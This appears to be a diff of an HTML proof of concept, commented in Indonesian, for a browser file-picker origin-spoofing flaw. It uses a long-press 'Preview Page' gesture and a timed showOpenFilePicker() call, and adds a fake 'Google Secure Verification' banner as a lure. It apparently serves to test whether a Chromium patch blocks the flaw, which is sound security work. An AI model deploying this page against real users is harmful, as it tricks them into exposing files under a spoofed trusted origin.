@@ -1,11 +1,92 @@
-<a href="https://google.com">Long Press -> Preview Page </a>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC - File Picker Origin Spoofing Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+            background-color: #f4f4f9;
+        }
+        .fake-banner {
+            background-color: #4285F4;
+            color: white;
+            padding: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .instruction {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 30px;
+        }
+        a {
+            display: inline-block;
+            background-color: #ffffff;
+            border: 2px solid #4285F4;
+            color: #4285F4;
+            padding: 15px 25px;
+            text-decoration: none;
+            font-weight: bold;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        #status {
+            margin-top: 20px;
+            font-style: italic;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
 
-<script>
-document.addEventListener("contextmenu", () => {
-  setTimeout(async () => {
-    try {
-      await window.showOpenFilePicker();
-    } catch (e) {}
-  }, 3000);
-});
-</script>
+    <div class="fake-banner">Google Secure Verification</div>
+    
+    <div class="instruction">
+        Silakan lakukan <b>Long Press</b> pada tautan di bawah ini, lalu pilih <b>"Preview Page"</b> (Pratinjau Halaman):
+    </div>
+
+    <!-- Tautan target untuk memicu konteks menu / preview page -->
+    <a href="https://google.com" id="targetLink">Long Press -> Preview Page</a>
+
+    <div id="status">Status: Menunggu interaksi pengguna...</div>
+
+    <script>
+        const statusDiv = document.getElementById("status");
+
+        // Event listener untuk mendeteksi gestur long press / contextmenu
+        document.addEventListener("contextmenu", (event) => {
+            statusDiv.innerText = "Status: Context menu terdeteksi! Mempersiapkan dialog...";
+            
+            // Menggunakan setTimeout dinamis untuk mencocokkan waktu animasi preview sheet terbuka
+            setTimeout(async () => {
+                try {
+                    statusDiv.innerText = "Status: Memanggil showOpenFilePicker()...";
+                    
+                    // Memanggil File System Access API
+                    await window.showOpenFilePicker();
+                    
+                    statusDiv.innerText = "Status: Berhasil memunculkan dialog file picker!";
+                } catch (e) {
+                    // Jika patch diterapkan (Chromium CL 8412770), pemanggilan ini akan memunculkan DOMException/dibatalkan
+                    statusDiv.innerText = "Status: Ditolak atau diblokir oleh sistem (Patch aktif). Error: " + e.message;
+                }
+            }, 3000); // Penundaan 3 detik untuk menyesuaikan durasi panel preview muncul
+        });
+
+        // Tambahan opsi pemantauan visibilitas dokumen untuk uji regresi tingkat lanjut
+        document.addEventListener("visibilitychange", () => {
+            if (document.hidden) {
+                console.log("Dokumen berada di latar belakang.");
+            } else {
+                console.log("Dokumen kembali aktif.");
+            }
+        });
+    </script>
+
+</body>
+</html>
